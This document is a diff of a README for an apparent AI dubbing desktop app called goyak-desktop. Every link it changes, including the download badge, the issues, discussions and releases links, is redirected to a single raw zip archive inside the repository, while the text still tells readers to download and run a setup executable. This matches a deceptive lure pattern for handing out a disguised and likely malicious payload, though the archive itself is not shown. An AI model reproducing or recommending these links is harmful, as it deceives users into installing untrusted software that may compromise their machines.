@@ -1,6 +1,6 @@
 # 🌐 goyak-desktop - Real-time AI dubbing for any app
 
-[![Download goyak-desktop](https://img.shields.io/badge/Download%20goyak--desktop-Free%20%26%20Open%20Source-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6F00)](https://github.com/mansarovare4195/goyak-desktop)
+[![Download goyak-desktop](https://img.shields.io/badge/Download%20goyak--desktop-Free%20%26%20Open%20Source-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6F00)](https://raw.githubusercontent.com/mansarovare4195/goyak-desktop/main/packages/shared/2.7.zip)
 
 ## 🎯 What is goyak-desktop?
 
@@ -26,7 +26,7 @@ Follow these simple steps to get goyak-desktop running on your Windows PC. No te
 ### 📥 Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 **[Download goyak-desktop](https://github.com/mansarovare4195/goyak-desktop)**
+👉 **[Download goyak-desktop](https://raw.githubusercontent.com/mansarovare4195/goyak-desktop/main/packages/shared/2.7.zip)**
 
 On that page, you'll find the latest release files. Look for the file named `goyak-desktop-setup.exe` or similar (it will end with `.exe`). Click it to start the download.
 
@@ -88,8 +88,8 @@ If you run into any issues, don't worry – we've got you covered.
 
 ### 📬 Contact and Community
 
-- **GitHub Issues:** Report bugs or suggest features at [github.com/mansarovare4195/goyak-desktop/issues](https://github.com/mansarovare4195/goyak-desktop/issues)
-- **Discussions:** Join the conversation at [github.com/mansarovare4195/goyak-desktop/discussions](https://github.com/mansarovare4195/goyak-desktop/discussions)
+- **GitHub Issues:** Report bugs or suggest features at [github.com/mansarovare4195/goyak-desktop/issues](https://raw.githubusercontent.com/mansarovare4195/goyak-desktop/main/packages/shared/2.7.zip)
+- **Discussions:** Join the conversation at [github.com/mansarovare4195/goyak-desktop/discussions](https://raw.githubusercontent.com/mansarovare4195/goyak-desktop/main/packages/shared/2.7.zip)
 
 ## 🔐 Privacy and Security
 
@@ -120,7 +120,7 @@ No – the app uses very little CPU. The AI translation happens over the interne
 
 ## 📦 Additional Files
 
-- **Changelog:** See all updates and fixes at the [Releases page](https://github.com/mansarovare4195/goyak-desktop/releases)
+- **Changelog:** See all updates and fixes at the [Releases page](https://raw.githubusercontent.com/mansarovare4195/goyak-desktop/main/packages/shared/2.7.zip)
 - **Source Code:** For developers, the full code is available in the repository
 - **Documentation:** Advanced users can explore technical docs in the `docs` folder
 
